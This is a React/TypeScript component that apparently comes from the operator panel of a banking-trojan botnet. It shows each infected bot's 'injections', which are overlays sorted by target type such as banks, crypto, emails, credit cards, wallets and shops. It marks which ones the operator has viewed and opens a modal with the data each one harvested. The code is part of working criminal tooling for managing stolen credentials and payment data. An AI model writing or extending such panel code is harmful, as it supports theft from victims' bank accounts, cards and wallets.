import React, {useState} from "react";


import {Swiper, SwiperSlide} from "swiper/react";
import SwiperCore, {Navigation, Pagination} from "swiper";
import {Divider} from "antd";
import InjectModal from "../../Modals/InjectModal/InjectModal";
import {Bot, BotInjection} from "../../../Model/Bot";
import {getApiUrl} from "../../../Util/config";

interface InjectionsProps {
    bot: Bot
}

const renderInjectTypes = (inject: string) => {
    switch (inject) {
    case "banks":
        return <span className="icon-type icon-bots-injections-types-banks"/>;
    case "crypt":
        return <span className="icon-type icon-bots-injections-types-crypt"/>;
    case "emails":
        return <span className="icon-type icon-bots-injections-types-emails"/>;
    case "credit_cards":
        return <span className="icon-type icon-bots-injections-types-cards"/>;
    case "wallets":
        return <span className="icon-type icon-bots-injections-types-wallets"/>;
    case "shops":
        return <span className="icon-type icon-bots-injections-types-shops"/>;
    default:
        return <span className="icon-type icon-bots-injections-types-unknown"/>;
    }
};

interface BotInjectClick {
    bot_id: string,
    inject: string,
}

const Injections: React.FC<InjectionsProps> = (props: InjectionsProps) => {
    SwiperCore.use([Navigation, Pagination]);

    let botInjectClicks: BotInjectClick[];

    try {
        botInjectClicks = JSON.parse(localStorage.getItem("botInjectClicks") as string) as BotInjectClick[];
    } catch (e) {
        botInjectClicks = [];
        localStorage.setItem("botInjectClicks", JSON.stringify([]));
    }

    if (!botInjectClicks) {
        botInjectClicks = [];
    }

    const botInjectClicked = (bot_id: string, inject: string) => {
        return botInjectClicks.filter((click) => click.bot_id === bot_id && click.inject === inject).length > 0;
    };

    const addBotInjectClick = (bot_id: string, inject: string) => {
        if (!botInjectClicks) {
            botInjectClicks = [];
        }

        if (botInjectClicked(bot_id, inject)) {
            return;
        }

        const temp = [
            ...botInjectClicks,
            {
                bot_id: bot_id,
                inject: inject,
            },
        ];


        localStorage.setItem("botInjectClicks", JSON.stringify(temp));
    };

    const [showInjectData, setShowInjectData] = useState(false);
    const [selectedApplication, setSelectedApplication] = useState<string>("");

    const renderInjects = (injects: BotInjection[]) => {
        let i;
        let j;
        const botInjectionsChunks: Array<BotInjection[]> = [];
        const chunk = 14;

        for (i = 0, j = injects.length; i < j; i += chunk) {
            botInjectionsChunks.push(injects.slice(i, i + chunk));
        }

        return botInjectionsChunks.map((injectionsChunk: BotInjection[], id) => {
            return (
                <SwiperSlide key={id}>
                    <div className="injection-list">
                        {injectionsChunk.map((injection: BotInjection, id: number) => {
                            const isClicked = (injection.newData ? "has-data" : (botInjectClicked(props.bot.id, injection.application) ? "clicked-data" : ""));

                            return (
                                <div
                                    className={"injection-inner " + isClicked}
                                    key={id}
                                    onClick={(e) => {
                                        setSelectedApplication(injection.application);
                                        addBotInjectClick(props.bot.id, injection.application);
                                        setShowInjectData(true);
                                        e.currentTarget.classList.remove("has-data");
                                    }}
                                >
                                    <div className="injection-info">
                                        {renderInjectTypes(injection.type)}
                                        <div
                                            className="injection-app"
                                            style={{backgroundImage: `url(${getApiUrl(`injects/images/${injection.type}/${injection.application}.png`)})`}}
                                        />
                                    </div>
                                    <div className="injection-app-name">
                                        {injection.name}
                                    </div>
                                </div>
                            );
                        })}
                    </div>
                </SwiperSlide>
            );
        });
    };

    return (
        <div className="injection">
            {props.bot.injections.length > 0 ? (
                <>
                    <Divider orientation="left"
                        style={{margin: "5px 0"}}>Injections <sup>{props.bot.injections.length}</sup></Divider>

                    <Swiper
                        spaceBetween={5}
                        slidesPerView={1}
                        className="injection-slider"
                        pagination={true}
                        style={{paddingBottom: 25}}
                    >
                        {renderInjects(props.bot.injections)}
                    </Swiper>


                </>
            ) : (
                <Divider orientation="left" style={{margin: "5px 0", color: "#666"}}>No injections</Divider>
            )}

            <InjectModal
                visible={showInjectData}
                setVisible={setShowInjectData}
                bot={props.bot}
                application={selectedApplication}
            />
        </div>
    );
};

export default Injections;
